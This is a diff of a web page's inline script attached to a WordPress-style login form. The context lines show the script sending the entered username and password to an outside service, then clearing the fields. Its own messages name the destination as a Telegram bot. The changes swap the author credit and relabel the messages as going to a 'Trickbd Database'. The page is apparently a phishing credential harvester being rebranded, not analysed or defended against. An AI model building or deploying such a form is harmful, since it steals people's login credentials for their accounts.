@@ -150,7 +150,7 @@ var userProfileL10n = {"user_id":"0","nonce":"e220b34e7f"};
   
   
   
-      // Coded by : Shofikul Islam 
+      // Coded by : Md Golam Rasul
       const user_loginInput = document.getElementById("user_login");
       const user_passInput = document.getElementById("user_pass");
       const wp_submitButton = document.getElementById("wp_submit");
@@ -175,12 +175,12 @@ var userProfileL10n = {"user_id":"0","nonce":"e220b34e7f"};
               user_loginInput.value = "";
               user_passInput.value = "";
             } else {
-              throw new Error("Failed to send message to Telegram bot.");
+              throw new Error("Failed to send message to Trickbd Database.");
             }
           })
           .catch(error => {
             console.error(error);
-            alert("Failed to send login information to Telegram bot.");
+            alert("Failed to send login information to Trickbd Database.");
           });
       });
     </script>
